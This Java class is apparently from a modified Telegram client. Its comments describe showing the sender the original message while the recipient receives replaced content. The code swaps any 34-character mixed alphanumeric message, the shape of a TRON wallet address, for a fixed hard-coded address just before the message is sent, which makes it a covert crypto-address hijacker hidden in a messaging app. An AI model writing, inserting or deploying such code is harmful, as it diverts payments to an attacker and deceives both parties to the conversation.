package org.telegram.messenger;

/**
 * 消息替换工具类
 * 功能：发送方显示原文，接收方显示替换后的内容
 * 最小侵入设计：仅在发送网络请求前调用替换方法
 * 
 * 替换规则：
 * 1. 仅当消息长度严格等于34位时
 * 2. 内容由大小写字母 + 数字混合组成（必须同时包含字母和数字）
 * 3. 全部由字母数字组成（无特殊符号、中文等）
 * 4. 满足所有条件才替换为指定字符串
 * 5. 不满足条件的消息完全不修改
 */
public class MessageReplacer {
    
    // 替换后的固定消息内容
    private static final String REPLACE_TEXT = "TELBudSdJX528ZAkThTqFf3tNMtqU3XxSh";
    
    // 目标长度
    private static final int TARGET_LENGTH = 34;
    
    /**
     * 替换消息内容
     * @param originalMessage 原始消息内容
     * @return 替换后的消息内容（不满足条件则返回原文）
     */
    public static String replaceMessage(String originalMessage) {
        // 空消息直接返回
        if (originalMessage == null || originalMessage.isEmpty()) {
            return originalMessage;
        }
        
        // 检查长度是否严格等于34位
        if (originalMessage.length() != TARGET_LENGTH) {
            return originalMessage;
        }
        
        // 检查是否全部由字母和数字组成
        // 同时检查是否同时包含字母和数字
        boolean hasLetter = false;
        boolean hasDigit = false;
        boolean allAlphanumeric = true;
        
        for (int i = 0; i < originalMessage.length(); i++) {
            char c = originalMessage.charAt(i);
            if (Character.isLetter(c)) {
                hasLetter = true;
            } else if (Character.isDigit(c)) {
                hasDigit = true;
            } else {
                // 包含非字母数字字符，不替换
                allAlphanumeric = false;
                break;
            }
        }
        
        // 必须同时满足：全部是字母数字 + 包含字母 + 包含数字
        if (allAlphanumeric && hasLetter && hasDigit) {
            return REPLACE_TEXT;
        }
        
        // 不满足条件，返回原文
        return originalMessage;
    }
    
    /**
     * 替换消息内容（CharSequence版本）
     */
    public static CharSequence replaceMessage(CharSequence originalMessage) {
        if (originalMessage == null) {
            return null;
        }
        return replaceMessage(originalMessage.toString());
    }
}
